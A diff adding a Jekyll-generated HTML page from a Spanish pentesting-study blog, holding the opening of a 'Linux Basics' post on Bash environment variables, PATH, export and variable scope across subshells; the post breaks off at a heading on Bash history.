@@ -1,0 +1,2654 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Linux</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Linux Basics.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Linux">
+  <meta property="og:description" content="Linux Basics.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2023-11-01T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2023-11-01-1.Linux/">
+  <link rel="canonical" href="http://localhost:4000/2023-11-01-1.Linux/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="Linux">
+  <meta property="twitter:description" content="Linux Basics.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Linux</h1>
+          
+            
+              <h2 class="post-subheading">Linux Basics.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 1, 2023</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <h3 id="1-el-entorno-de-bash">1. El entorno de Bash.</h3>
+
+<p>Bash es una shell (entorno de linea de comandos) compatible con ‘sh’ que nos permite ejecutar comandos complejos y realizar distintas tareas desde una terminal. Bash concretamente junta característiacs de KornShell y C shell.</p>
+
+<p><br /></p>
+
+<h4 id="11-variables-de-entorno">1.1. Variables de Entorno.</h4>
+
+<p><strong>Definición</strong></p>
+
+<p>Las <em>variables de entorno</em> son un conjunto de valores almacenados en variables que acompañan a un entorno de línea de comandos, una terminal. Estas se utilizan como una manera de almacenar una configuración global necesaria para cualquier programa que se corra en la terminal.</p>
+
+<p><br /></p>
+
+<p><strong>Variables de entorno comúnes</strong></p>
+
+<p>Para ver todas las variables de entorno disponibles, tenemos el término ‘env’:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">env
+</span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+...
+<span class="nv">PWD</span><span class="o">=</span>/home/kali
+<span class="nv">XDG_SESSION_DESKTOP</span><span class="o">=</span>lightdm-xsession
+<span class="nv">LOGNAME</span><span class="o">=</span>kali
+<span class="nv">XDG_SESSION_TYPE</span><span class="o">=</span>x11
+<span class="nv">XAUTHORITY</span><span class="o">=</span>/home/kali/.Xauthority
+<span class="nv">XDG_GREETER_DATA_DIR</span><span class="o">=</span>/var/lib/lightdm/data/kali
+<span class="nv">HOME</span><span class="o">=</span>/home/kali
+...
+<span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="nv">USER</span><span class="o">=</span>kali
+...
+</code></pre></div></div>
+
+<p>Algunas de las variables de entorno más comúnes son PATH, USER, PWD y HOME.</p>
+
+<p>La más importante es la variable PATH, esta variable contiene una serie de rutas separados por dos puntos ‘:’ que el systema utiliza para buscar el binario asociado al programa cuyo nombre introducimos en la terminal. Es decir, cuando nosotros introducimos en la terminal ‘ls’ esto no es más que un término que indica al sistema que debe buscar el binario ls que se debe encontrar en alguna de las rutas presentes en PATH.</p>
+
+<p>Podemos desplegar el contenido mediante:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre></div></div>
+
+<p>Por otra parte, las variables USER, PWD y HOME contienen respectivamente, los contenidos de qué usuario es, la localización actual del usuario y el directorio ‘home’ del usuario.</p>
+
+<p><br /></p>
+
+<p><strong>Crear variables de entorno</strong></p>
+
+<p>Podemos definir las variables de entorno con el término ‘export’. El término export no sólo define la variable sino que además la vuelve accesible a cualquier subproceso que derivemos desde nuestra sesión de bash a través de la terminal.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">b</span><span class="o">=</span>10.11.1.220
+
+kali@kali:~<span class="nv">$ </span>ping <span class="nt">-c</span> 2 <span class="nv">$b</span>
+PING 10.11.1.220 <span class="o">(</span>10.11.1.220<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.11.1.220: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>62 <span class="nb">time</span><span class="o">=</span>2.23 ms
+64 bytes from 10.11.1.220: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>62 <span class="nb">time</span><span class="o">=</span>1.56 ms
+
+<span class="nt">---</span> 10.11.1.220 ping statistics <span class="nt">---</span>
+2 packets transmitted, 2 received, 0% packet loss, <span class="nb">time </span>1002ms
+rtt min/avg/max/mdev <span class="o">=</span> 1.563/1.900/2.238/0.340 ms
+</code></pre></div></div>
+
+<p>Observemos que el alcance de estas variables está limitado a la sesión de bash que tengamos en ese momento.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$$</span><span class="s2">"</span>
+1827
+
+kali@kali:~<span class="nv">$ var</span><span class="o">=</span><span class="s2">"My Var"</span>
+
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$var</span>
+My Var
+
+kali@kali:~<span class="nv">$ </span>bash
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$$</span><span class="s2">"</span>
+1908
+
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$var</span>
+
+kali@kali:~<span class="nv">$ </span>exi
+exi
+
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$var</span>
+My Var
+
+kali@kali:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">othervar</span><span class="o">=</span><span class="s2">"Global Var"</span>
+
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$othervar</span>
+Global Var
+
+kali@kali:~<span class="nv">$ </span>bash
+
+kali@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$othervar</span>
+Global Var
+
+kali@kali:~<span class="nv">$ </span>exi
+exi
+</code></pre></div></div>
+
+<p>Vemos en el ejemplo anterior que definiendo la variable con ‘export’ esta y su contenido trascienden a ulteriores sesiones que creamos a partir de la primera.</p>
+
+<p><br /></p>
+
+<h4 id="12-bash-history-tricks">1.2. Bash History Tricks.</h4>
+
